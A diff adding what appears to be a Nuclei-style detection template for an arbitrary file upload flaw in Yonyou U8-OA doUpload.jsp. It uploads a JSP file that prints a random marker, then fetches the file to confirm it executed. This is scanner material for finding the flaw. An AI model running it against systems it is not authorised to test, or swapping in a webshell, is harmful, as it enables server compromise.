@@ -1,0 +1,57 @@
+id: poc-yaml-yonyou-doUpload-jsp-anyfile-upload
+info:
+  name: 用友U8-OA doUpload.jsp 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/yyoa/portal/tools/doUpload.jsp"
+    headers:
+      Content-Type: multipart/form-data; boundary=7b1db34fff56ef636e9a5cebcd6c9a75
+    body: |-
+      --7b1db34fff56ef636e9a5cebcd6c9a75
+      Content-Disposition: form-data; name="iconFile"; filename="{{t1}}.jsp"
+      Content-Type: application/octet-stream
+
+      <% out.println("{{t2}}"); %>
+      --7b1db34fff56ef636e9a5cebcd6c9a75--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "window.returnValue ="
+    extractors:
+      - type: regex
+        internal: true
+        name: file
+        part: body
+        regex:
+          - "(?P<file>[0-9]+)"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/yyoa/portal/upload/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
